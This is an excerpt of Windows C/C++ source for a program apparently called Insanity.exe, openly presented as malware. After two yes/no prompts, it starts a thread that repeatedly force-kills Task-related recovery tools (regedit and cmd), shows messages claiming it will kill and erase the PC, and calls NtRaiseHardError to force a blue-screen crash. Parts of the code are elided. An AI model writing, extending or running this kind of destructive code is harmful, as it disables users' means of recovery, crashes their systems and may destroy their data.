...
DWORD WINAPI spamkill(LPVOID lpParam)
{
	while (1)
	{
		ShellExecuteA(NULL, NULL, "taskkill", "/f /im regedit.exe", NULL, SW_HIDE);
		Sleep(1);
		ShellExecuteA(NULL, NULL, "taskkill", "/f /im cmd.exe", NULL, SW_HIDE);
		Sleep(1);
	}
	return 666;
}
...
DWORD WINAPI msg(LPVOID lpParam) {
	MessageBox(NULL, L"Insanity.exe will kill your pc now", L"Waiting for my death.", MB_ICONERROR);
	return 0;
}
...
{
	if (MessageBoxW(NULL, L"Run Short Malware?", L"Insanity.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? it will erase your pc", L"Last Warning.", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			...
			CloseHandle(thread6);
			HANDLE final = CreateThread(0, 0, MsgSpamThread, 0, 0, 0);
			Sleep(3000);
			BOOLEAN bl;
			DWORD response;
			...
			ULONG_PTR args[] = { (ULONG_PTR)"Unknown Error Orrured Unknown Error Orrured Unknown Error Orrured Unknown Error Orrured Unknown Error Orrured Unknown Error Orrured Unknown Error Orrured Unknown Error Orrured Unknown Error Orrured Unknown Error Orrured " }; //Custom BSOD yay!
			NtRaiseHardError(0xDEADDEAD, 1, 0, (PULONG)args, 6, &response);
